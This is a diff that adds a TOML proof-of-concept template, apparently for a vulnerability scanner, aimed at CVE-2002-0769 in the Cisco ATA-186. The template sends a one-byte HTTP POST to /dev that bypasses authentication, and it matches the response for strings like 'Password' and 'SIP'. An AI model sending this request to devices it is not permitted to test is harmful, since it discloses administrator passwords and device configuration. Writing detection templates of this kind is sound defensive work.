@@ -1,0 +1,43 @@
+[info]
+author = "AVE"
+description = "通过向 Cisco ATA-186 的 /dev 路径发送单字节 HTTP POST 请求绕过认证，获取设备配置信息（含管理员密码）"
+id = "POC-AVE-2002-0428"
+name = "CVE-2002-0769 Cisco ATA-186 HTTP Device Configuration Disclosure PoC"
+severity = "medium"
+tags = [
+    "cve-2002-0769",
+    "cisco",
+    "ata-186",
+    "configuration-disclosure",
+]
+vuln_id = [
+    "CVE-2002-0769",
+    "AVE-2002-0428",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/dev"
+protocol = "http"
+
+[poc.requests.body]
+content = "a"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Password",
+    "password",
+    "PWD",
+    "SIP",
+    "Cisco ATA",
+]
